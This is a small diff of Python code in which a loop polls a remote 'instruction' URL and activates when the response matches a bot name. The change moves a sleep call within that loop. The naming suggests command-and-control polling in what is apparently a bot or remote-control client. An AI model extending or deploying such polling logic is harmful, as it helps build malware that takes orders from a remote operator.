@@ -54,10 +54,10 @@ def connect():
 # ======================================================== #
 
 while True: # Tests for instruction every 10 seconds.
+	time.sleep(5)
 	if ACTIVE == False:
 		if connections['instruction'] != 'manual':
 			ACTIVE = ( urllib.request.urlopen(connections['instruction']).read() == botname )
-		time.sleep(10)
 		continue
 	elif ( ACTIVE == True ) or ( ACTIVE == 'manual' ):
 		try:
